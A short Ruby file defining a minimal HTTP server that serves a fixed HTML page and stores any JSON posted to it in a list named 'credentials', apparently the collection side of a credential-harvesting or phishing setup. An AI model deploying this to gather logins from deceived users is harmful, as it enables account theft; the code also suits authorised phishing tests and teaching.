require 'socket'

def start_http_server(html, port, credentials)
    return Thread.new do
        server = TCPServer.open(port)
        loop {
            socket = server.accept

            headers = {}
            method, path = socket.gets.split
            
            while line = socket.gets.split(" ", 2)
                break if line[0] == ""
                headers[line[0].chop] = line[1].strip
            end

            post_body = socket.read(headers["Content-Length"].to_i)

            begin
                jsonData = JSON.parse(post_body)
                credentials.push(jsonData)
            rescue
            end
            
            socket.puts("HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: #{html.length}\r\n\r\n#{html}\r\n")
            socket.close
        }
    end
end